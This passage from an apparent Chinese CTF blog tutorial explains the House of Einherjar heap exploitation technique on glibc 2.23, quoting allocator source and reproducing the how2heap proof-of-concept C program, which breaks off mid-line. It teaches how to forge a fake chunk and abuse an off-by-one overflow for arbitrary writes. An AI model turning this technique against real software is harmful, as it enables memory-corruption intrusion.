= unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h3 id="unlink源码"><a class="markdownIt-Anchor" href="#unlink源码"></a> unlink源码</h3><details>    <summary>unlink宏定义</summary><ul><li><code>glibc2.23--malloc.c</code>第1413行开始</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></details><h3 id="其他源码"><a class="markdownIt-Anchor" href="#其他源码"></a> 其他源码</h3><details>    <summary>其他源码</summary><ul><li><code>glibc2.23--malloc.c</code>第1303行获取size的值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><ul><li><code>glibc2.23--malloc.c</code>第1219行，用于将<code>free(addr)</code>这个<code>addr</code>回退到<code>chunk的头部</code>而不是chunk中<code>size</code>之后的地址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure></details><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><h2 id="前向合并和后向合并"><a class="markdownIt-Anchor" href="#前向合并和后向合并"></a> 前向合并和后向合并</h2><ul><li>之前对于源码中的注释<code>consolidate backward</code>和<code>consolidate forward</code>到底哪个是前向合并哪个是后向合并有点搞不清楚。</li><li>这里先对自己对堆块的认知做一个统一，按照注释中的意识，我们将<strong>地址增加</strong>的方向当做前，<strong>地址减少</strong>的方向当做后。</li><li>所以之前在<code>unlink</code>中所写的可能有点相反了。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129132159238.png" alt="image-20250129132159238"></p><ul><li>了解了堆管理隐式链表技术和之前学习的<code>unlink</code>，就可以来学习<code>house of einherjar</code>的漏洞利用方式了。与该利用方式相关的代码是<code>unlink</code>和<code>_int_free</code>中的代码<code>前向合并</code>和<code>后向合并</code>的部分代码。<code>unlink</code>的代码上面有，这边主要是截取<code>_int_free</code>的部分代码。<ul><li>这边注释所说的<code>consolidate backward</code>就是我们释放的堆块与其后面的堆块合并，叫做后向合并</li><li>这边注释所说的<code>consolidate forward </code>就是我们释放的堆块与其前面的堆块合并，叫做前向合并</li><li>由于后向合并会更新p指针，使其指向低地址的堆块。所以在<code>unlink</code>时，<code>p</code>指针都是指向两个要合并堆块中低地址的那一块。</li><li><code>house of einherjar</code>主要用到的是堆块的<code>后向合并</code>（正常堆块为前、伪造的堆块在后或者能溢出修改<code>p</code>位的堆块在前、伪造的堆块在后）</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">     prevsize = p-&gt;prev_size;</span><br><span class="line">     size += prevsize;</span><br><span class="line">     p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">     unlink(av, p, bck, fwd);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="利用原理"><a class="markdownIt-Anchor" href="#利用原理"></a> 利用原理</h2><ul><li><p>接下来就详细说明一下<code>house of einherjar</code>具体的利用过程。<code>house of einherjar</code>是利用<code>unlink</code>的过程和<code>堆管理隐式链表技术</code>的不安全进行漏洞利用的。</p><ul><li>在堆块中，两个物理相邻的<code>chunk</code>会共享<code>prev_size</code>字段，尤其是当低地址的<code>chunk</code>处于使用状态的时（此时高地址的堆中<code>prev_inuse</code>位为<code>1</code>）高地址的<code>chunk</code>的<code>prev_size</code>字段可以被低地址的<code>chunk</code>使用。因此，我们有希望可以通过写低地址的<code>chunk</code>覆盖高地址<code>chunk</code>的<code>prev_size</code>字段。</li><li>一个chunk的<code>prev_inuse</code>位标记了其物理地址相邻的低地址chunk的使用状态，而且该位是和<code>prev_size</code>物理相邻。</li><li>后向合并时，<code>p</code>指针会被更新，更新到两个合并堆块中所处地址更小的一个堆块。即<code>p = chunk_at_offset(p, -((long) prevsize));</code></li></ul></li><li><p>首先我们的利用过程如下（这边我给出两种利用方式）其中一种方式是博客普遍上有的，另一种应该可以（刚学没遇到）。</p></li><li><p><strong>利用方式</strong>：这边我们先申请了两个堆块（实际上要三个，防止与<code>top_chunk</code>相邻的堆块与<code>top_chunk</code>合并），将其命名为<code>chunk0</code>和<code>chunk_1</code>，他们的物理地址的结构如图所示。（<strong>图中一些数据可能要重新布置，图中size为<code>0x40</code>可能无法利用<code>house of einherjar</code>，具体设置细节看实验或者利用原理的最后</strong>）</p></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129141937364.png" alt="image-20250129141937364"></p><ul><li>我们先伪造一个<code>fake_chunk</code>，<code>fake_chunk</code>的具体要求伪造要求之后再说。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129142005588.png" alt="image-20250129142005588"></p><ul><li>我们对<code>chunk0</code>进行写操作，此时需要<code>off-by-one</code>漏洞，这样我们将<code>chunk0</code>的数据溢出到<code>chunk1</code>中，并且修改了chunk1中<code>prev_size</code>的值和也修改chunk1中<code>p</code>位的值为<code>0</code>。其中<code>prev_size</code>的值应该为<code>chunk1_addr - fake_chunk_addr</code>（二者要么都用<code>prev_size</code>的地址相减，要么都用fd指针所存储的地址相减）。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129142111498.png" alt="image-20250129142111498"></p><ul><li>这时我们将<code>chunk1</code>释放，就会触发<code>后向合并</code>。我们就会更新<code>p</code>指针为<code>p = chunk_at_offset(p, -((long))</code>，此时<code>p</code>就指向了<code>fake_chunk</code>。这时合并后就会出现这么一大块的空间。并且合并后的堆块会被放入<code>unsorted_bin</code>中被管理</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129140947908.png" alt="image-20250129140947908"></p><ul><li><p>之后我们再使用<code>malloc</code>申请一个堆块，这个堆块这个堆块就会从fake_chunk开始，切割一部分然后返回给用户使用。这样我们就达到了任意地址写的目的。</p></li><li><p><strong>注意</strong>：由于要计算<code>prev_size</code>的大小，所以需要泄露<code>堆地址</code>和<code>fake_chunk</code>的地址。</p></li><li><p>在这个过程中我们需要<strong>修改</strong>的数据如下：（可以先看实验之后再来看这边）</p><ul><li>我们要通过溢出修改高地址堆块的<code>prev_size</code>为<code>该堆地址</code>到<code>fake_chunk</code>的偏移地址</li><li>我们还要修改更高地址堆块的<code>P</code>位为<code>0</code>，如果该堆块的<code>size</code>不是<code>0x100</code>整数倍的话，还需要修改该堆块的<code>size</code>位使得其是<code>0x100</code>的整数倍，并且要确保<code>M</code>和<code>M</code>位为<code>0</code>。（其实也可以修改<code>size</code>位为0x00）</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129151326528.png" alt="image-20250129151326528"></p><ul><li>我们<code>fake_chunk</code>的所需要伪造的地方：<ul><li><code>prev_size</code>位：如果能伪造就尽量伪造成我们所要<code>unlink</code>的另一个堆块的size大小（即上面溢出的堆块的size）。(貌似<code>glibc2.23</code>,对<code>prev_size</code>位检查没那么高)<strong>经过测试fake_chunk的prev_size位不需要伪造</strong></li><li>对于<code>P</code>位：一定要置0，这样才能触发<code>unlink</code>，对于<code>M</code>和<code>N</code>位需要保持<code>0</code>即可</li><li>对于<code>size</code>位：一定要和<code>b</code>堆块的<code>prev_size</code>相同大小（这样才能绕过检查机制）</li><li>对于<code>fd</code>、<code>bk</code>、<code>fd_nextsize</code>、<code>bk_nextsize</code>都指向<code>fake_chunk</code>的开头，至少要满足<code>fd</code>、<code>bk</code>指向<code>fake_chunk</code>的开头这样才能绕过<code>unlink</code>的检查机制。当申请的堆块比较大时就会多出两个元数据，即<code>fd_nextsize</code>、<code>bk_nextsize</code>。这样我们对于<code>fd</code>、<code>bk</code>、<code>fd_nextsize</code>、<code>bk_nextsize</code>赋值相同的值，就可以绕过<code>unlink</code>的检查。</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204101148949.png" alt="image-20250204101148949"></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>这时<code>how2heap</code>上<code>glibc2.23</code>的<code>house of einherjar.c</code>的源码</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* a;</span><br><span class="line"><span class="type">uint8_t</span>* b;</span><br><span class="line"><span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line"><span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + 